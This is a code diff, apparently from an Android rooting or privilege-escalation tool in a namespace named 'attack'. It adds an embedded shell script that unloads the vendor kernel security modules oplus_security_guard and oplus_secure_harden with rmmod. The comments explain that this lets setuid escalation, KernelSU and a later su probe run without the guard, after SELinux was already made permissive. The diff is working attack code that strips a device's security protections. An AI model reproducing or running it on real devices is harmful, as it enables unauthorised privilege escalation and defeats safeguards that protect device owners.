@@ -751,6 +751,33 @@ namespace ghostlock::attack {
             "if grep -q '^kernelsu[[:space:]]' /proc/modules 2>/dev/null; then\n"
             "  echo '[+] KernelSU already loaded' >>\"$LOG\"\n"
             "fi\n"
+            /* Measured 2026-11-15 on this device: kernelsu is Live and the
+             * manager is crowned, yet nothing that calls setuid survives,
+             * because oplus_security_guard runs the escalation check from a
+             * sys_exit tracepoint. That module is a loadable .ko whose refcount
+             * is 0 (`oplus_secure_harden` is held only by it), so the check may
+             * not need a write primitive at all: delete_module unregisters the
+             * tracepoint outright. rmmod needs CAP_SYS_MODULE, which init_cred
+             * already carries, and W1 left SELinux permissive. Run it before
+             * the KernelSU work so that, if it succeeds, the rest of this same
+             * run -- including the su probe at the end -- runs guard-free.
+             * Instrumentation-gated: the product path is unchanged. */
+            "if [ \"$NO_INSTR\" -eq 0 ]; then\n"
+            "  gu_cap=$(grep CapEff /proc/self/status 2>/dev/null | cut -f2)\n"
+            "  gu_md=$(cat /proc/sys/kernel/modules_disabled 2>/dev/null)\n"
+            "  gu_before=$(grep -cE '^oplus_(security_guard|secure_harden)[[:space:]]' /proc/modules 2>/dev/null)\n"
+            "  gu_exe=$(command -v rmmod 2>/dev/null)\n"
+            "  [ -n \"$gu_exe\" ] || gu_exe=/system/bin/rmmod\n"
+            "  echo \"GUARD-BEFORE count=$gu_before cap=$gu_cap modules_disabled=${gu_md:-unreadable} rmmod=$gu_exe\"\n"
+            "  echo \"[*] guard before count=$gu_before cap=$gu_cap md=${gu_md:-unreadable} rmmod=$gu_exe\" >>\"$LOG\"\n"
+            /* security_guard first: secure_harden's refcount of 1 is held by it,
+             * so the reverse order would just fail with EBUSY. */
+            "  \"$gu_exe\" oplus_security_guard 2>>\"$LOG\"; gu_rc1=$?\n"
+            "  \"$gu_exe\" oplus_secure_harden 2>>\"$LOG\"; gu_rc2=$?\n"
+            "  gu_after=$(grep -cE '^oplus_(security_guard|secure_harden)[[:space:]]' /proc/modules 2>/dev/null)\n"
+            "  echo \"GUARD-UNLOAD rc1=$gu_rc1 rc2=$gu_rc2 before=$gu_before after=$gu_after\"\n"
+            "  echo \"[*] guard unload rc1=$gu_rc1 rc2=$gu_rc2 after=$gu_after\" >>\"$LOG\"\n"
+            "fi\n"
             "# step 1: restore policy\n"
             /* The dump is a *working copy* -- patched in place, then handed to
              * load_policy -- never evidence, and nothing reads it afterwards.
